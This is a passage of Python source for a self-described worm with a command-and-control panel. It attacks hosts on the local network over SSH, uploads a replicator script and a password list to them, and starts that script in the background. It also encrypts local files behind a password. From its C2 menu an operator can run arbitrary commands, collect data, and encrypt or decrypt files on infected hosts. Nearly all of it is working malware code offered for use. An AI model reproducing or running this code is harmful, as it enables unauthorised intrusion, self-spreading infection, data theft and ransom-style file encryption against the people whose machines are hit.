                    ip = addr['addr']
                    if not ip.startswith('127.'):
                        return '.'.join(ip.split('.')[:3]) + '.'
    except:
        pass
    return '192.168.1.'

def scan_and_infect():
    """Scan network and infect other hosts"""
    # This would contain the infection logic
    print("🐛 Scanning for hosts to infect...")
    pass

if __name__ == "__main__":
    print("🐛 Worm replicator started!")
    while True:
        try:
            scan_and_infect()
            time.sleep(60)
        except:
            pass
'''
    
    try:
        with open("./replicator.py", "w") as f:
            f.write(replicator_code)
        os.chmod("./replicator.py", 0o755)
        print("✅ Created replicator.py")
        return True
    except Exception as e:
        print(f"❌ Could not create replicator.py: {e}")
        return False

def upload_and_execute(ssh, ip):
    """Upload worm files and execute on target"""
    print(f"📤 Uploading worm to {ip}...")
    
    try:
        sftp = ssh.open_sftp()
        
        stdin, stdout, stderr = ssh.exec_command("mkdir -p /tmp/worm")
        stdout.channel.recv_exit_status()
        
        if not os.path.exists("./replicator.py"):
            if not create_replicator_script():
                return False
        
        files_to_upload = [("./replicator.py", "/tmp/worm/replicator.py")]
        
        if os.path.exists("./passwords.txt"):
            files_to_upload.append(("./passwords.txt", "/tmp/worm/passwords.txt"))
        
        for local_path, remote_path in files_to_upload:
            try:
                sftp.put(local_path, remote_path)
                print(f"✅ Uploaded: {local_path}")
            except Exception as e:
                print(f"❌ Failed to upload {local_path}: {e}")
        
        sftp.close()
        
        ssh.exec_command("chmod +x /tmp/worm/replicator.py")
        
        print("📦 Installing dependencies on target...")
        stdin, stdout, stderr = ssh.exec_command("cat /etc/os-release 2>/dev/null || echo unknown")
        os_info = stdout.read().decode()
        
        if "ubuntu" in os_info.lower() or "debian" in os_info.lower():
            ssh.exec_command("sudo apt-get update -qq")
            ssh.exec_command("sudo apt-get install -y python3-pip python3-paramiko python3-netifaces -qq")
        elif "centos" in os_info.lower() or "rhel" in os_info.lower():
            ssh.exec_command("sudo yum install -y python3 python3-pip")
            ssh.exec_command("sudo pip3 install paramiko netifaces")
        else:
            ssh.exec_command("pip3 install paramiko netifaces 2>/dev/null || pip install paramiko netifaces")
        
        print(f"🚀 Starting worm on {ip}...")
        ssh.exec_command("cd /tmp/worm && nohup python3 replicator.py > /tmp/worm.log 2>&1 &")
        
        print(f"✅ Worm deployed successfully on {ip}")
        return True
        
    except Exception as e:
        print(f"❌ Error deploying worm to {ip}: {e}")
        return False

# ============================================================
# MAIN FUNCTIONS
# ============================================================

def run_worm(db=None):
    """Main worm execution"""
    print("\n🐛 WORM PROPAGATION PHASE")
    print("="*50)
    
    if not db:
        db = WormDatabase()
    
    local_ip = get_current_IP_address()
    print(f"🖥️ Local IP: {local_ip}")
    
    hosts = get_list_of_hosts()
    
    if not hosts:
        print("❌ No hosts found on the network!")
        return False
    
    print(f"\n📊 Found {len(hosts)} hosts, starting attack...")
    print("="*50)
    
    infected_count = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for host in hosts:
            if host == local_ip:
                continue
            future = executor.submit(attack_ssh, host, db)
            futures.append(future)
        
        for future in as_completed(futures):
            try:
                if future.result():
                    infected_count += 1
            except Exception as e:
                logging.error(f"Error in attack: {e}")
    
    print("="*50)
    print(f"✅ Worm propagation complete!")
    print(f"📊 Infected {infected_count} hosts")
    logging.info(f"Worm infected {infected_count} hosts")
    
    return True

def setup_password_secure():
    """Setup password for first time"""
    print("\n🔑 FIRST TIME SETUP")
    print("Create a secure password:")
    print("- At least 12 characters")
    print("- Uppercase, lowercase, number, special character")
    print()
    
    while True:
        password = getpass.getpass("Enter password: ")
        confirm = getpass.getpass("Confirm password: ")
        
        if password != confirm:
            print("❌ Passwords don't match!")
            continue
        
        if len(password) < 12:
            print("❌ Password too short!")
            continue
        
        if not any(c.isupper() for c in password):
            print("❌ Need uppercase letter!")
            continue
        
        if not any(c.islower() for c in password):
            print("❌ Need lowercase letter!")
            continue
        
        if not any(c.isdigit() for c in password):
            print("❌ Need a number!")
            continue
        
        if not any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
            print("❌ Need special character!")
            continue
        
        break
    
    stored_hash = hash_password(password)
    config = load_config()
    config["password_hash"] = stored_hash
    config["files_encrypted"] = False
    save_config(config)
    
    print("\n✅ Setup complete! Your password is securely stored.")
    return True

def change_password_secure():
    """Change password"""
    print("\n🔑 CHANGE PASSWORD")
    config = load_config()
    
    if not config.get("password_hash"):
        print("No password set!")
        return False
    
    old_password = getpass.getpass("Enter current password: ")
    if not verify_password(old_password, config["password_hash"]):
        print("❌ Incorrect password!")
        return False
    
    print("\nEnter new password:")
    while True:
        new_password = getpass.getpass("New password: ")
        confirm = getpass.getpass("Confirm: ")
        
        if new_password != confirm:
            print("❌ Passwords don't match!")
            continue
        
        if len(new_password) < 12:
            print("❌ Password too short!")
            continue
        
        if not any(c.isupper() for c in new_password):
            print("❌ Need uppercase!")
            continue
        
        if not any(c.islower() for c in new_password):
            print("❌ Need lowercase!")
            continue
        
        if not any(c.isdigit() for c in new_password):
            print("❌ Need number!")
            continue
        
        if not any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in new_password):
            print("❌ Need special character!")
            continue
        
        break
    
    new_hash = hash_password(new_password)
    config["password_hash"] = new_hash
    save_config(config)
    
    print("✅ Password changed successfully!")
    return True

# ============================================================
# INTERACTIVE C2 MENU
# ============================================================

def c2_interactive_menu():
    """Interactive C2 command menu"""
    db = WormDatabase()
    c2 = C2Server(db)
    c2.start()
    
    while True:
        print("\n" + "="*60)
        print("🎮 C2 CONTROL PANEL")
        print("="*60)
        print("1. 📊 Show infected hosts")
        print("2. 📁 Show encrypted files")
        print("3. 📝 Show pending commands")
        print("4. 📡 Issue new command")
        print("5. 📊 Show collected data")
        print("6. 🔑 Change encryption password remotely")
        print("7. 🔓 Decrypt files remotely")
        print("8. 🔄 Refresh status")
        print("9. 🚪 Exit C2 mode")
        print("="*60)
        
        choice = input("\nSelect option: ").strip()
        
        if choice == "1":
            c2.show_infected_hosts()
        
        elif choice == "2":
            c2.show_encrypted_files()
        
        elif choice == "3":
            print("\n📝 PENDING COMMANDS")
            conn = db.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                SELECT command_id, target_host, command, issued_time, priority
                FROM commands
                WHERE status = 'pending'
                ORDER BY priority DESC, issued_time ASC
            ''')
            commands = cursor.fetchall()
            conn.close()
            
            if commands:
                print(f"{'ID':<10} {'Target':<36} {'Command':<20} {'Time':<20} {'Priority'}")
                print("-"*90)
                for cmd in commands:
                    print(f"{cmd[0]:<10} {cmd[1][:36]:<36} {cmd[2]:<20} {cmd[3][:19]:<20} {cmd[4]}")
            else:
                print("No pending commands")
        
        elif choice == "4":
            print("\n📡 ISSUE NEW COMMAND")
            hosts = db.get_infected_hosts()
            
            if not hosts:
                print("No infected hosts available!")
                continue
            
            print("\nTarget hosts:")
            for i, host in enumerate(hosts):
                print(f"{i+1}. {host['ip']} ({host['hostname']}) - {host['status']}")
            
            host_choice = input("\nSelect host number (or 'all'): ").strip()
            
            if host_choice.lower() == 'all':
                target = 'all'
            else:
                try:
                    idx = int(host_choice) - 1
                    if 0 <= idx < len(hosts):
                        target = hosts[idx]['host_id']
                    else:
                        print("Invalid selection")
                        continue
                except:
                    print("Invalid input")
                    continue
            
            print("\nAvailable commands:")
            print("1. collect_data - Collect system info")
            print("2. collect_data:file_list - Get file listing")
            print("3. execute - Run arbitrary command")
            print("4. change_password - Change encryption password")
            print("5. decrypt_files - Decrypt files")
            print("6. encrypt_files - Encrypt files")
            print("7. self_destruct - Remove worm")
            print("8. status - Get agent status")
            
            cmd_choice = input("\nSelect command: ").strip()
            
            command_map = {
                '1': ('collect_data', {}),
                '2': ('collect_data', {'data_type': 'file_list'}),
                '3': ('execute', {'cmd': input("Enter command to execute: ")}),
                '4': ('change_password', {'new_password': getpass.getpass("Enter new password: ")}),
                '5': ('decrypt_files', {'password': getpass.getpass("Enter decryption password: ")}),
                '6': ('encrypt_files', {}),
                '7': ('self_destruct', {}),
                '8': ('status', {})
            }
            
            if cmd_choice in command_map:
                cmd, params = command_map[cmd_choice]
                cmd_id = c2.execute_remote_command(target, cmd, params)
                print(f"✅ Command issued: {cmd_id}")
            else:
                print("Invalid command")
        
        elif choice == "5":
            c2.show_collected_data()
        
        elif choice == "6":
            print("\n🔑 CHANGE ENCRYPTION PASSWORD REMOTELY")
            hosts = db.get_infected_hosts()
            print("\nTarget hosts:")
            for i, host in enumerate(hosts):
                print(f"{i+1}. {host['ip']} ({host['hostname']})")
            
            host_choice = input("\nSelect host number: ").strip()
            try:
                idx = int(host_choice) - 1
                if 0 <= idx < len(hosts):
                    target = hosts[idx]['host_id']
                    new_password = getpass.getpass("Enter new password: ")
                    confirm = getpass.getpass("Confirm: ")
                    
                    if new_password == confirm:
                        c2.change_encryption_password(target, new_password)
                    else:
                        print("Passwords don't match!")
                else:
                    print("Invalid selection")
            except:
                print("Invalid input")
        
        elif choice == "7":
            print("\n🔓 DECRYPT FILES REMOTELY")
            hosts = db.get_infected_hosts()
            print("\nTarget hosts:")
            for i, host in enumerate(hosts):
                print(f"{i+1}. {host['ip']} ({host['hostname']})")
            
            host_choice = input("\nSelect host number: ").strip()
            try:
                idx = int(host_choice) - 1
                if 0 <= idx < len(hosts):
                    target = hosts[idx]['host_id']
                    password = getpass.getpass("Enter decryption password: ")
                    c2.decrypt_files_on_host(target, password)
                else:
                    print("Invalid selection")
            except:
                print("Invalid input")
        
        elif choice == "8":
            stats = db.get_stats()
            print(f"\n📊 Status: Infected: {stats['total_infected']} | "
                  f"Files: {stats['total_encrypted']} | "
                  f"Commands: {stats['pending_commands']} | "
                  f"Data: {stats['collected_data']}")
        
        elif choice == "9":
            c2.stop()
            print("👋 Exiting C2 mode")
            break
        
        else:
            print("❌ Invalid choice!")
        
        input("\nPress Enter to continue...")

# ============================================================
# MAIN PROGRAM
# ============================================================

def main():
    """Main program with complete functionality"""
    print("\n🐛 WORM WITH C2 CAPABILITIES")
    print("="*50)
    
    # Initialize database
    db = WormDatabase()
    
    # Load config
    config = load_config()
    
    # Check if password is set
    if not config.get("password_hash"):
        print("🔑 No password found. Running first-time setup...")
        if not setup_password_secure():
            print("Setup failed. Exiting.")
            return
        config = load_config()
    
    while True:
        print("\n" + "="*50)
        print("🔐 MAIN MENU")
        print("="*50)
        print("1. 🐛 Run worm (propagate to other systems)")
        print("2. 🔒 Encrypt files")
        print("3. 🔓 Decrypt files")
        print("4. 🔑 Change password")
        print("5. 🎮 C2 Control Panel")
        print("6. 📊 Show status")
        print("7. 🤖 Start C2 Agent (runs on this machine)")
        print("8. 🚪 Exit")
        print("="*50)
        
        choice = input("\nSelect option (1-8): ").strip()
        
        if choice == "1":
            print("\n🐛 Starting worm propagation...")
            run_worm(db)
        
        elif choice == "2":
            if not config.get("files_encrypted"):
                auto_encrypt_files()
                config = load_config()
            else:
                print("\n⚠️ Files are already encrypted!")
        
        elif choice == "3":
            if config.get("files_encrypted"):
                decrypt_files()
                config = load_config()
            else:
                print("\nℹ️ Files are already decrypted!")
        
        elif choice == "4":
            change_password_secure()
            config = load_config()
        
        elif choice == "5":
            c2_interactive_menu()
        
        elif choice == "6":
            stats = db.get_stats()
            print("\n=== STATUS ===")
            print(f"Password set: {'✅ Yes' if config.get('password_hash') else '❌ No'}")
            print(f"Files encrypted: {'✅ Yes' if config.get('files_encrypted') else '❌ No'}")
            print(f"Infected hosts: {stats['total_infected']}")
            print(f"Encrypted files: {stats['total_encrypted']}")
            print(f"Pending commands: {stats['pending_commands']}")
            print(f"Collected data: {stats['collected_data']}")
            print(f"Config file: {CONFIG_FILE}")
            print(f"Database: {DB_FILE}")
            
            # Show recent infected hosts
            hosts = db.get_infected_hosts()
            if hosts:
                print("\nRecent infected hosts:")
                for host in hosts[:5]:
                    print(f"  • {host['ip']} ({host['hostname']}) - {host['status']}")
        
        elif choice == "7":
            print("\n🤖 Starting C2 Agent...")
            agent = C2Agent(db, config)
            try:
                agent.run()
            except KeyboardInterrupt:
                print("\n🛑 Agent stopped")
        
        elif choice == "8":
            print("\n👋 Goodbye!")
            break
        
        else:
            print("❌ Invalid choice!")
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    main()
